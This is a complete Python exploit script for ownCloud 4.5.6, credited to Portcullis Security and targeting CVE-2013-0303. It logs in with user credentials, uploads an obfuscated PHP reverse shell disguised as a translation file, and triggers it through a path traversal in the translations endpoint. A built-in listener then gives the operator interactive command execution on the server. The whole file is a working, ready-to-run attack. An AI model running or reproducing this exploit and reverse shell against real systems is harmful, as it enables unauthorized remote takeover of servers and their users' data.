################################################################### 
### 
###        ** ownCloud Remote Code Execution Exploit **
### 
### Tested in versions 4.5.6. Prior versions are probably 
### vulnerable too.
### 
### This code exploits the vulnerability CVE-2013-0303:
### 
### * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0303
### * http://owncloud.org/about/security/advisories/oC-SA-2013-006/
### 
### The exploit was coded by:
###     -> Julio Gomez Ortega - JGO@portcullis-security.com
### 
### From Portcullis Security - http://www.portcullis-security.com/
### 
################################################################### 

import sys
import getopt
import urllib2
import urllib
import re
import threading
import time
from socket import *


WINDOWS = 1
LINUX = 0
SHELL = '''
<?php
$ipaddr='%s';
$port=%s;

@set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
$dis=@ini_get('disable_functions');
if(!empty($dis)){ 
$dis=preg_replace('/[, ]+/', ',', $dis);
$dis=explode(',', $dis);
$dis=array_map('trim', $dis);
}else{
$dis=array();
}


if(!function_exists('mPqje')){

function mPqje($c){
global $dis;

if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
$c=$c." 2>&1\n";
}
$HIwrElf='is_callable';
$IerF='in_array';

if($HIwrElf('system')and!$IerF('system',$dis)){
ob_start();
system($c);
$o=ob_get_contents();
ob_end_clean();
}else
if($HIwrElf('exec')and!$IerF('exec',$dis)){
$o=array();
exec($c,$o);
$o=join(chr(10),$o).chr(10);
}else
if($HIwrElf('shell_exec')and!$IerF('shell_exec',$dis)){
$o=shell_exec($c);
}else
if($HIwrElf('popen')and!$IerF('popen',$dis)){
$fp=popen($c,'r');
$o=NULL;
if(is_resource($fp)){
while(!feof($fp)){
$o.=fread($fp,1024);
}
}
@pclose($fp);
}else
if($HIwrElf('passthru')and!$IerF('passthru',$dis)){
ob_start();
passthru($c);
$o=ob_get_contents();
ob_end_clean();
}else
if($HIwrElf('proc_open')and!$IerF('proc_open',$dis)){
$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
$o=NULL;
while(!feof($pipes[1])){
$o.=fread($pipes[1],1024);
}
@proc_close($handle);
}else
{
$o=0;
}

return $o;
}
}
$nofuncs='no exec functions';
if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
$s=@fsockopen("tcp://".$ipaddr,$port);
while($c=fread($s,2048)){
$out = '';
if(substr($c,0,3) == 'cd '){
chdir(substr($c,3,-1));
} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
break;
}else{
$out=mPqje(substr($c,0,-1));
if($out===false){
fwrite($s,$nofuncs);
break;
}
}
fwrite($s,$out.' ');
}
fclose($s);
}else{
$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
@socket_connect($s,$ipaddr,$port);
@socket_write($s,"socket_create");
while($c=@socket_read($s,2048)){
$out = '';
if(substr($c,0,3) == 'cd '){
chdir(substr($c,3,-1));
} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
break;
}else{
$out=mPqje(substr($c,0,-1));
if($out===false){
@socket_write($s,$nofuncs);
break;
}
}
@socket_write($s,$out.' ',strlen($out));
}
@socket_close($s);
}
?>
'''

##############################################################################
### Basic Methods
##############################################################################

#######################################
def printWelcome():
	'''This method prints a welcome message.'''
	
	print '''
**************************************************************
ownCloud Remote Code Execution for vulnerability CVE-2013-0303
**************************************************************
'''

#######################################
def printSyntax():
	'''This method prints the sintax of the exploit.'''

	print '''Syntax:
-------

%s -u USER -p PASSWORD -H IP -P PORT [--proxy PROXY] LOGIN_URL

Options:
--------

  -u USER\t\tValid ownCloud username.
  --user USER
  
  -p PASSWORD\t\tValid ownCloud password.
  --password PASSWORD
  
  -H IP\t\t\tIP where the PHP shell will try to connect to.
  --lhost IP
  
  -P PORT\t\tPort where the PHP shell will try to connect to.
  --lport PORT
  
  --proxy\t\tHTTP/s proxy to use for HTTP requests.

Examples:
---------

%s -u test -p test -H 127.0.0.1 -P 9999 http://127.0.0.1
%s -u test -p test -H 127.0.0.1 -P 9999 --proxy http://127.0.0.1:8080 http://127.0.0.1
''' % (sys.argv[0], sys.argv[0], sys.argv[0])

#######################################
def printConfiguration(target, user, password, lhost, lport):
	'''This method prints the input options.'''
	
	print '''
Input options:
--------------
Target:\t\t%s
User:\t\t%s
Password:\t%s
Local IP:\t%s
Port to listen:\t%s
''' % (target, user, password, lhost, lport)


#######################################
def preprocessTarget(target):
	'''This method preprocesses the input target.'''
	
	if target.lower().endswith('.php'):
		return target
	
	if target.endswith('/'):
		return target + 'index.php'
	
	return target + '/index.php'


#######################################
def setupUrllib2(proxy=None):
	'''This method setup urllib2 with cookies and proxy if required.'''
	
	cookiesOpener = urllib2.HTTPCookieProcessor()
	
	if proxy:
		urllib2.install_opener(urllib2.build_opener(cookiesOpener, urllib2.ProxyHandler({"http" : proxy, "https" : proxy})))
	else:
		urllib2.install_opener(urllib2.build_opener(cookiesOpener))




#######################################
def createShell (lhost, lport):
	'''This method build the PHP shell which will be uploaded.'''
	
	return SHELL % (lhost, lport)




##############################################################################
### Steps to run the reverse shell
##############################################################################

#######################################
def login(target, user, password):
	'''This method log into ownCloud.'''
	
	print "[*] Login into ownCloud..."
	
	# Log into ownCloud
	try:
		
		# Extract CSRF token if exists
		response = urllib2.urlopen(target)
		html = response.read()
		
		sectoken = None
		match = re.search(r'"sectoken" value="[^"]*"', html)
		if match:
			sectoken = match.group().split('"')[3]
		
		# Login
		params = {"user": user, "password": password}
		if sectoken:
			params["sectoken"] = sectoken
		params = urllib.urlencode(params)
		
		headers = {"Referer" : target}
		
		request = urllib2.Request(target, params, headers)
		response = urllib2.urlopen(request)
		html = response.read()
		
		if 'logout' in html.lower():
			print "\033[92m[*]\033[0m Login successful"
			
			match = re.search(r"requesttoken\s*=\s*'[^']*'", html)
			if match:
				return (True, match.group().split("'")[1])
			else:
				return (True, None)
			
		else:
			print "\033[91m[*]\033[0m An error occurred during login."
			return (False, None)
	
	except:
		print "\033[91m[*]\033[0m An error occurred during login."
		return (False, None)



#######################################
def createFolder(root, csrf):
	'''This method create a folder called l10n.'''

	print "[*] Creating l10n folder" 
	
	# Create the folder
	try:
		url = root + "/?app=files&getfile=ajax/newfolder.php"
		params = {"dir": "/", "foldername": "l10n"}
		if csrf:
			params["requesttoken"] = csrf
		params = urllib.urlencode(params)
	
		headers = {
			"Referer" : root, 
			"requesttoken" : csrf
		}
		
		request = urllib2.Request(url, params, headers)
		response = urllib2.urlopen(request)
		html = response.read()
		
		if '"status":"success"' in html:
			print "\033[92m[*]\033[0m Folder created!"
			return True
		else:
			#print "\033[91m[*]\033[0m The folder could not be created."
			print "[*] Cheking if it was correctly created."
			
			url = root + "/?app=files&dir=/l10n"
			response = urllib2.urlopen(url)
			
			if "index.php" not in response.geturl().lower():
				print "\033[92m[*]\033[0m Folder created!"
				return True
			
			else:
				print "\033[91m[*]\033[0m The folder could not be created in the server."
				return False
			
			
			return False
		
	except:
		print "\033[91m[*]\033[0m An error occurred during creating the l10n folder"
		return False




#######################################
def uploadPHPShell(root, shell, csrf):
	'''This method uploads the PHP shell.'''
	
	print "[*] Uploading Reverse PHP Shell..."
	
	# Upload the shell
	try:
		url = root + "/?app=files&getfile=ajax%2Fupload.php"
		body = '''-----------------------------21191376031994875607185408411
Content-Disposition: form-data; name="MAX_FILE_SIZE"

536870912
-----------------------------21191376031994875607185408411
Content-Disposition: form-data; name="requesttoken"

%s
-----------------------------21191376031994875607185408411
Content-Disposition: form-data; name="dir"

/l10n/
-----------------------------21191376031994875607185408411
Content-Disposition: form-data; name="files[]"; filename="en.php"
Content-Type: text/plain

%s
-----------------------------21191376031994875607185408411--''' % (csrf, shell)
	
		headers = {
			"Referer" : root, 
			"Content-Type" : "multipart/form-data; boundary=---------------------------21191376031994875607185408411",
			"requesttoken" : csrf
		}
		
		request = urllib2.Request(url, body, headers)
		response = urllib2.urlopen(request)
		html = response.read()
		
		if '"status":"success"' in html:
			print "\033[92m[*]\033[0m Shell uploaded."
			return True
		else:
			
			# Try to access to the shell
			url = root + "?app=files&getfile=download.php?file=/l10n/en.php"
			
			try:
				response = urllib2.urlopen(url)
				print "\033[92m[*]\033[0m Shell uploaded."
				return True
			except:
				print "\033[91m[*]\033[0m Shell could not be uploaded."
				return False
		
	except:
		print "\033[91m[*]\033[0m An error occurred during uploading the shell in the %s tab."
		return False






##############################################################################
### New thread to launch the PHP shell
##############################################################################
class LaunchPHPShell(threading.Thread):
	
	def __init__(self, root, user, csrf):
		threading.Thread.__init__(self)
		self.root = root
		self.user = user
		self.csrf = csrf
  
	def run(self):  
		'''This methods launch the reverse PHP shell.'''

		print "[*] Executing the PHP shell..."

		try:
			url = self.root + "/core/ajax/translations.php"
			params = {"app" : "../data/%s/files" % self.user }
			params = urllib.urlencode(params)
			
			headers = {
				"Referer" : self.root, 
				"requesttoken" : self.csrf,
				"Accept-Language" :  "en-us;q=0.7,en;q=0.3"
			}
			
			request = urllib2.Request(url, params, headers)
			response = urllib2.urlopen(request)
			
		except:
			print "\033[91m[*]\033[0m An error occurred trying to execute the shell."
		
		

##############################################################################
### New thread to use the TCP Socket
##############################################################################
class Shell(threading.Thread):
	
	BUFSIZE = 4*4096  
	
	def __init__(self, lhost, lport, user):  
		threading.Thread.__init__(self)
		self.lhost = lhost
		self.lport = int(lport)
		self.user = user
	
	def run(self):
		'''This method listens for a new TCP connection and execute
		a command shell'''
		
		print "[*] Preparing to receive the TCP connection..."
		
		# Wait for new connections
		server = socket( AF_INET,SOCK_STREAM)    
		server.bind( (self.lhost, self.lport) )
		server.listen(1)
		connection, address = server.accept()
		print "\033[92m[*]\033[0m Connection received from %s:%d. Launching the shell...\n" % (address[0], address[1])
		
		# Detect the OS of the server (*NIX vs Windows)
		os = LINUX
		connection.send('echo %cd% ')
		data = connection.recv(self.BUFSIZE)
		if data.strip() != "%cd%":
			os = WINDOWS
		
		# Execute a command shell
		command = ""
		originalDir = None
		while True:
			
			# Get the current directory 
			if os == WINDOWS:
				connection.send('echo %cd% ')
				data = connection.recv(self.BUFSIZE).strip() + ">"
				
				if not originalDir:
					originalDir = data.strip()[:-1]
			else:
				connection.send('echo `whoami`@`hostname`:`pwd` ')
				data = connection.recv(self.BUFSIZE).strip() + "$ "
				
				if not originalDir:
					originalDir = data[data.index(':')+1:-2] + '/'
			
			# Ask for a new command
			command = raw_input('%s' % data)
			
			if command.lower() in ('exit', 'quit'):
				break
			
			# Send the command and print the results
			connection.send(command + ' ')
			data = connection.recv(self.BUFSIZE)
			print data
		
		# Clean the server and close the socket
		print "\n[*] Cleaning the server..."
		if os == WINDOWS:
			connection.send('rmdir /S /Q %s\\..\\..\\data\\%s\\files\\l10n ' % (originalDir, self.user) )
		else:
			connection.send('rm -R %s../../data/%s/files/l10n ' % (originalDir, self.user) )
		connection.send('exit ')
		
		time.sleep(1)
		
		connection.close()
		




##############################################################################
### Main Method
##############################################################################

#######################################
def main ():
	'''Main method of the exploit.'''
	user = None
	password = None
	target = None
	root = None
	proxy = None
	lhost = None
	lport = None
	
	printWelcome()
	
	# Read input parameters
	try:
		options, remainder = getopt.getopt (sys.argv[1:], 'hu:p:P:H:', ['help', 'user=', 'password=', 'proxy=', 'lhost=', 'lport='])
	except:
		printSyntax()
		return 1
	
	for opt, arg in options:
		
		# Show the help
		if opt in ('-h', '--help'):
			printSyntax()
			return 0
		
		# Load the user
		if opt in ('-u', '--user'):
			user = arg
		
		# Load the password
		if opt in ('-p', '--password'):
			password = arg
		
		# Load the proxy
		if opt == '--proxy':
			proxy = arg
		
		# Load the host where the PHP shell will try to connect
		if opt in ('-H', '--lhost'):
			lhost = arg
		
		# Load the port where listening
		if opt in ('-P', '--lport'):
			lport = arg
		
	
	if len(remainder) == 1:
		target = preprocessTarget(remainder[0])
		root = '/'.join(target.split('/')[:-1])
	else:
		printSyntax()
		return 1
	
	# Check the input parameters
	if (not user or not password or not target or not lhost or not lport or not lport.isdigit()):
		printSyntax()
		return 1
	
	# Print the input options
	printConfiguration(target, user, password, lhost, lport)
	
	###########################################
	### Begining of the exploit
	###########################################
	setupUrllib2(proxy)
	cont = True
	
	# 1. Login into the application
	cont, csrf = login(target, user, password)
	
	if not cont:
		return 2
	
	# 2. Create the l10n folder
	cont = createFolder(root, csrf)
	
	
	# 3. Upload the PHP shell
	shell = createShell (lhost, lport)
	cont = uploadPHPShell(root, shell, csrf)
	
	if not cont:
		return 2
	
	
	## 4. Listen for incoming TCP requests in a second thread
	thrshell = Shell(lhost, lport, user)
	thrshell.start()
	time.sleep(1)

	# 5. Execute the PHP Shell
	thrphp = LaunchPHPShell(root, user, csrf)
	thrphp.start()
	
	# 6. Wait for both threads to finish
	thrshell.join()
	thrphp.join()
	
	return 0
	



if __name__ == "__main__":
	status = main()
	print "[*] Exiting...\n"
	sys.exit(status)

